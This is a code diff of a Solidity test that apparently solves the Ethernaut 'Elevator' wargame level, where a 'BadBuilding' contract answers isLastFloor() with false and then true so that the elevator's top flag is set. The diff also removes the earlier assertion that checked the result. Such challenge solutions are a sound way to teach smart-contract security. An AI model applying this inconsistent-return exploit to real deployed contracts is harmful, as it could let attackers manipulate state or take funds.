@@ -24,8 +24,9 @@ contract TestElevator is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = Elevator(levelAddress);
 
@@ -34,48 +35,42 @@ contract TestElevator is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
 
+        // The goal here is to set the top variable of Elevator to true
+        // I need to exploit the faulty goTo() that calls isLastFloor() twice
+        // First return should be false to pass the check, the second one true, which is assigned to top
+        // The point here is that we should not trust external contracts like this
         vm.startPrank(player, player);
 
-        // Never ever trust anything that is a blackbox
-        // If you need to do an integration with an external contract/protocol
-        // always look for the documentation and the source code
-        // will they act as expected? are they upgradable? can you trust the team?
-        // In this case, our `Exploiter` contract just returned what we wanted to return
-        // to pass the challenge without even caring about the `floor` they passed to us
-        // to know if it was the last one or not
-
-        Exploiter exploiter = new Exploiter(level);
-        exploiter.goTo(0);
-
-        assertEq(level.top(), true);
+        // Call the goTo function with contract that will return false and then true
+        BadBuilding badBuilding = new BadBuilding(level);
+        badBuilding.goTo();
 
         vm.stopPrank();
     }
 }
 
-contract Exploiter is Building {
-    Elevator private victim;
-    address private owner;
-    bool firstCall;
+contract BadBuilding {
+    Elevator elevator;
+    bool firstCall = true;
 
-    constructor(Elevator _victim) public {
-        owner = msg.sender;
-        victim = _victim;
-        firstCall = true;
+    constructor(Elevator _elevator) public {
+        elevator = _elevator;
     }
 
-    function goTo(uint256 floor) public {
-        victim.goTo(floor);
+    function goTo() public {
+        elevator.goTo(1);
     }
 
-    function isLastFloor(uint256) external override returns (bool) {
+    function isLastFloor(uint256) public returns (bool) {
         if (firstCall) {
             firstCall = false;
             return false;
-        } else {
-            return true;
         }
+
+        return true;
     }
 }
